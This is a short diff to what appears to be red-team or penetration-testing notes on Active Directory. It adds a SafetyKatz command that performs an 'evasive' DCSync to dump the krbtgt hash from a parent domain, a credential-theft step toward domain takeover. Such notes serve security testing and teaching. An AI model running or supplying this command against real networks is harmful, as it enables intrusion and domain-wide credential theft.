@@ -23,3 +23,9 @@ Then use `SafetyKatz` to perform `DCSync`:
 ```
 
 This command retrieves the NT hash of the `krbtgt` user.
+
+If you have a ticket for a parent domain, add the correct DC to the parameters:
+
+```powershell
+> SafetyKatz.exe "lsadump::evasive-dcsync /user:parentdomain\krbtgt /domain:parentdomain.local" "exit"
+```
